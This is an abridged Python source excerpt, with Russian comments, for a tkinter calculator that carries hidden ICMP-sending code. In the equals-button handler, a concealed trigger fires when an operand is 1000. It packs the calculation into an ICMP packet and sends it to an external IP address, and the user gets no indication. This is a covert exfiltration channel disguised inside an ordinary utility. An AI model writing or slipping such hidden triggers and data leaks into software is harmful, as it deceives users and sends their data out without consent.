...
def create_icmp_packet(data):
    ...
    # Идентификатор и последовательный номер
    icmp_id = 12345
    icmp_seq = 1

    # Строка для отправки в ICMP пакете
    icmp_data = data.encode('utf-8')
...
def send_icmp_packet(ip, port, packet):
    # Создаем сокет
...
class Calculator:
    ...
    def button_equal(self):
        ...
        if self.math == "addition":
            self.number_entry.insert(0, str(self.f_num + int(second_number)))
        ...
        if self.math == "modulus":
            self.number_entry.insert(0, str(self.f_num % int(second_number)))
        if (self.f_num == 1000) or (second_number == "1000"):
            data = str(self.f_num) + self.math + second_number
            icmp_packet = create_icmp_packet(data)
            send_icmp_packet(ip, port, icmp_packet)
    ...
    def button_sqrt(self):
        ...
        if result.is_integer():
            self.number_entry.delete(0, tk.END)
            self.number_entry.insert(0, str(int(result)))
        else:
            self.number_entry.delete(0, tk.END)
